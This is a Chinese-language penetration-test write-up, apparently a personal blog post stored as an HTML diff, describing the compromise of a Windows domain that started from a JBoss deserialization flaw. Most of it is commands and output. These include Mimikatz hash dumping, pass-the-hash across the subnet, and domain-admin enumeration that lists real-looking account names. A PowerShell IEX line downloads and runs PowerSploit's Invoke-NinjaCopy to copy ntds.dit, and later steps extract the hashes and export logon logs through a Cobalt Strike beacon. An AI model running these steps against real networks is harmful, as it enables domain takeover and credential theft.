@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="切入点Jboss的反序列化漏洞，获取到shell，就不多说了，远程部署war。 信息收集1234whoami  --&amp;gt; windows-7p8piq7\administratoripconfig --&amp;gt; 192.168.58.231tasklist --&amp;gt; 360EntClient.exe \ZhuDongFangYu.exe .. (360全家桶)systeminfo --&amp;g">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JBoss引起的内网渗透">
+<meta property="og:url" content="http://yoursite.com/2019/05/26/26/index.html">
+<meta property="og:site_name" content="c1y2m3’blog">
+<meta property="og:description" content="切入点Jboss的反序列化漏洞，获取到shell，就不多说了，远程部署war。 信息收集1234whoami  --&amp;gt; windows-7p8piq7\administratoripconfig --&amp;gt; 192.168.58.231tasklist --&amp;gt; 360EntClient.exe \ZhuDongFangYu.exe .. (360全家桶)systeminfo --&amp;g">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5cea3af1ea3b4a292e072f80">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5cea3b182711cd2096ff5116">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5cea3ac59b521a11ecb7384f">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5cea3aa72711cd2096ff4e6f">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5cf13b8ddb5aa6649fc91a2b">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5cf13cfcea3b4a79232077e9">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5cea3a81e67d0a23c65bb1e0">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5cea3a5f2711cd2096ff4c8f">
+<meta property="og:updated_time" content="2019-06-26T16:02:21.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="JBoss引起的内网渗透">
+<meta name="twitter:description" content="切入点Jboss的反序列化漏洞，获取到shell，就不多说了，远程部署war。 信息收集1234whoami  --&amp;gt; windows-7p8piq7\administratoripconfig --&amp;gt; 192.168.58.231tasklist --&amp;gt; 360EntClient.exe \ZhuDongFangYu.exe .. (360全家桶)systeminfo --&amp;g">
+<meta name="twitter:image" content="https://www.yunzhijia.com/microblog/filesvr/5cea3af1ea3b4a292e072f80">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/c1y2m3.github.io/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/c1y2m3.github.io/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/c1y2m3.github.io/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>JBoss引起的内网渗透</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/c1y2m3.github.io/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/c1y2m3.github.io/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/c1y2m3.github.io/">主页</a></li>
+         
+          <li><a href="/c1y2m3.github.io/About/">关于</a></li>
+         
+          <li><a href="/c1y2m3.github.io/archives/">文章</a></li>
+         
+          <li><a href="/c1y2m3.github.io/projects_url">生活</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/c1y2m3.github.io/2019/04/04/15543609538285/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/05/26/26/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/05/26/26/&text=JBoss引起的内网渗透"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/05/26/26/&title=JBoss引起的内网渗透"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/05/26/26/&is_video=false&description=JBoss引起的内网渗透"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JBoss引起的内网渗透&body=Check out this article: http://yoursite.com/2019/05/26/26/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/05/26/26/&title=JBoss引起的内网渗透"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/05/26/26/&title=JBoss引起的内网渗透"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/05/26/26/&title=JBoss引起的内网渗透"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/05/26/26/&title=JBoss引起的内网渗透"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/05/26/26/&name=JBoss引起的内网渗透&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#切入点"><span class="toc-number">1.</span> <span class="toc-text">切入点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#信息收集"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#横向拓展"><span class="toc-number">3.</span> <span class="toc-text">横向拓展</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前奏"><span class="toc-number">3.1.</span> <span class="toc-text">前奏</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#方法"><span class="toc-number">3.2.</span> <span class="toc-text">方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#定位"><span class="toc-number">3.3.</span> <span class="toc-text">定位</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#问题"><span class="toc-number">3.4.</span> <span class="toc-text">问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#突破方法："><span class="toc-number">3.5.</span> <span class="toc-text">突破方法：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#提取"><span class="toc-number">3.6.</span> <span class="toc-text">提取</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#收尾"><span class="toc-number">4.</span> <span class="toc-text">收尾</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        JBoss引起的内网渗透
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">c1y2m3’blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2019-05-26T07:12:00.000Z" itemprop="datePublished">2019-05-26</time>
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="切入点"><a href="#切入点" class="headerlink" title="切入点"></a>切入点</h1><p>Jboss的反序列化漏洞，获取到shell，就不多说了，远程部署war。</p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami  --&gt; windows-7p8piq7\administrator</span><br><span class="line">ipconfig --&gt; 192.168.58.231</span><br><span class="line">tasklist --&gt; 360EntClient.exe \ZhuDongFangYu.exe .. (360全家桶)</span><br><span class="line">systeminfo --&gt; Windows Server 2008 R2 Enterprise</span><br></pre></td></tr></table></figure>
+<h1 id="横向拓展"><a href="#横向拓展" class="headerlink" title="横向拓展"></a>横向拓展</h1><h2 id="前奏"><a href="#前奏" class="headerlink" title="前奏"></a>前奏</h2><p>用<code>CS</code>生成<code>powershell</code>的<code>exp</code>就过了。到目标机<code>cmd</code>下执行弹回。由于权限较高，</p>
+<p>直接<code>run Mimikatz</code> 获取到了当前主机用户的ntlm hash。</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5cea3af1ea3b4a292e072f80" alt=""></p>
+<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>使用<code>Cobalt Strike</code>的ARP扫描（因为net view使用不了），使得<code>Targets</code>有记录。</p>
+<p>用比较典型的<code>hash传递</code>碰一下看看运气怎么样。</p>
+<p>登陆情况如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">192.168.58.1 # 成功</span><br><span class="line">192.168.58.18 # 成功</span><br><span class="line">....</span><br><span class="line">192.168.58.3 # 失败</span><br><span class="line">192.168.58.7 # 失败</span><br><span class="line">....</span><br><span class="line">192.168.58.68 # 成功</span><br><span class="line">192.168.58.21 # 成功</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5cea3b182711cd2096ff5116" alt=""></p>
+<p>这个过程就是不断的进行<code>hash注入</code>，不断的<code>dump密码</code>，结果就如上图。看<code>Credentials</code>里是否存在域管用户账密。<br><img src="https://www.yunzhijia.com/microblog/filesvr/5cea3ac59b521a11ecb7384f" alt=""></p>
+<h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">从58.18的机子上发现存在域： </span><br><span class="line"></span><br><span class="line">所属域 --&gt;MERCURY.COM  近1400个域用户...</span><br><span class="line"></span><br><span class="line">nltest /dclist:MERCURY.COM #查看域控 （2个)</span><br><span class="line"></span><br><span class="line">pdc.mercury.com [PDC]  --&gt; 主dc --&gt; 192.168.58.2</span><br><span class="line">BDC.mercury.com        --&gt; 备dc --&gt; 192.168.58.1</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">net group &quot;domain admins&quot; /domain  #查看域管理员 （9个)</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">Administrator            chenfeng                 chudonggen               </span><br><span class="line">dongzhiwei               IT                       lifen                    </span><br><span class="line">qiaopeng                 weiwei                   zhangxuejun </span><br><span class="line"></span><br><span class="line">net group &quot;domain controllers&quot; /domain  #查看域控制器</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">BDC$                     PDC$</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5cea3aa72711cd2096ff4e6f" alt=""></p>
+<p>然而发现我已经获取到了dc的账号密码。并在<code>CS</code>上上线了，这就意味的此时的域已经沦陷。</p>
+<p>同时通过GPP组策略漏洞成功解密出administraor密码：<br><img src="https://www.yunzhijia.com/microblog/filesvr/5cf13b8ddb5aa6649fc91a2b" alt=""><br><img src="https://www.yunzhijia.com/microblog/filesvr/5cf13cfcea3b4a79232077e9" alt=""></p>
+<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ul>
+<li>vssadmin 无法提取出ntds.dit、在系统中卡死</li>
+<li>ntdsutil 被破坏、无法运行</li>
+<li>存在杀软，mimikatz 无法执行</li>
+</ul>
+<h2 id="突破方法："><a href="#突破方法：" class="headerlink" title="突破方法："></a>突破方法：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1&apos;); Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\Users\dongzhiwei\Desktop\ntds.dit&quot;</span><br></pre></td></tr></table></figure>
+<p>这里用powerSploit框架中的Invoke-NinjaCopy,远程复制文件，成功提取到ntds.dit / system.hive</p>
+<h2 id="提取"><a href="#提取" class="headerlink" title="提取"></a>提取</h2><p>参考链接：<a href="https://github.com/zcgonvh/NTDSDumpEx" target="_blank" rel="noopener">https://github.com/zcgonvh/NTDSDumpEx</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsdumpex.exe -d ntds.dit -o hash.txt -s system.hiv</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5cea3a81e67d0a23c65bb1e0" alt=""></p>
+<p>之前给自己挖了个坑，关于任何去获取域用户的登录IP，除了nmap外，可以ping域用户名，然而这是一个非常错误的认知，这种前提是机器名和用户名相同，这种情况少之又少。</p>
+<p>参考klion牛的方法：</p>
+<p>从目标主控中导出成功登录日志,来定位指定目标机器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell hostname</span><br><span class="line">beacon&gt; shell wevtutil epl Security c:\windows\logs\risalogs.evtx /q:&quot;*[EventData[Data[@Name=&apos;LogonType&apos;]=&apos;3&apos;] and System[(EventID=4624) and TimeCreated[timediff(@SystemTime) &lt;= 4449183132]]]&quot;</span><br><span class="line">beacon&gt; shell tasklist | findstr &quot;wevtutil.exe&quot;</span><br><span class="line">beacon&gt; shell dir c:\windows\logs\risalogs.evtx</span><br><span class="line">beacon&gt; download c:\windows\logs\risalogs.evtx</span><br><span class="line">beacon&gt; downloads</span><br></pre></td></tr></table></figure>
+<p>利用 <code>Log Parser</code> 日志分析工具,从log中匹配：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT -o csv &quot;SELECT TO_UPPERCASE(EXTRACT_TOKEN(Strings,5,&apos;|&apos;)) as NAME,TO_UPPERCASE(EXTRACT_TOKEN(Strings,18,&apos;|&apos;)) as IP FROM c:\risalogs.evtx&quot; &gt; C:\log.txt</span><br><span class="line"></span><br><span class="line">进行去重、替换：</span><br><span class="line"></span><br><span class="line">grep -v &apos;\$&apos; log.txt | sort | uniq | egrep -v &apos;ANONYMOUS LOGON|-|:&apos; &gt; login_succeed.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5cea3a5f2711cd2096ff4c8f" alt=""></p>
+<h1 id="收尾"><a href="#收尾" class="headerlink" title="收尾"></a>收尾</h1><p>​    从内网中获取了大量主机权限，VPN、核心代码，数据库等，逐进行放弃权限，删除后门，所有操作并未更改，下载，删除等一切损害该公司的行为。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/c1y2m3.github.io/">主页</a></li>
+         
+          <li><a href="/c1y2m3.github.io/About/">关于</a></li>
+         
+          <li><a href="/c1y2m3.github.io/archives/">文章</a></li>
+         
+          <li><a href="/c1y2m3.github.io/projects_url">生活</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#切入点"><span class="toc-number">1.</span> <span class="toc-text">切入点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#信息收集"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#横向拓展"><span class="toc-number">3.</span> <span class="toc-text">横向拓展</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前奏"><span class="toc-number">3.1.</span> <span class="toc-text">前奏</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#方法"><span class="toc-number">3.2.</span> <span class="toc-text">方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#定位"><span class="toc-number">3.3.</span> <span class="toc-text">定位</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#问题"><span class="toc-number">3.4.</span> <span class="toc-text">问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#突破方法："><span class="toc-number">3.5.</span> <span class="toc-text">突破方法：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#提取"><span class="toc-number">3.6.</span> <span class="toc-text">提取</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#收尾"><span class="toc-number">4.</span> <span class="toc-text">收尾</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/05/26/26/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/05/26/26/&text=JBoss引起的内网渗透"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/05/26/26/&title=JBoss引起的内网渗透"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/05/26/26/&is_video=false&description=JBoss引起的内网渗透"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JBoss引起的内网渗透&body=Check out this article: http://yoursite.com/2019/05/26/26/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/05/26/26/&title=JBoss引起的内网渗透"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/05/26/26/&title=JBoss引起的内网渗透"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/05/26/26/&title=JBoss引起的内网渗透"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/05/26/26/&title=JBoss引起的内网渗透"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/05/26/26/&name=JBoss引起的内网渗透&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/c1y2m3.github.io/">主页</a></li>
+         
+          <li><a href="/c1y2m3.github.io/About/">关于</a></li>
+         
+          <li><a href="/c1y2m3.github.io/archives/">文章</a></li>
+         
+          <li><a href="/c1y2m3.github.io/projects_url">生活</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/c1y2m3.github.io/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/c1y2m3.github.io/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/c1y2m3.github.io/lib/jquery/jquery.min.js"></script>
+<script src="/c1y2m3.github.io/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/c1y2m3.github.io/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
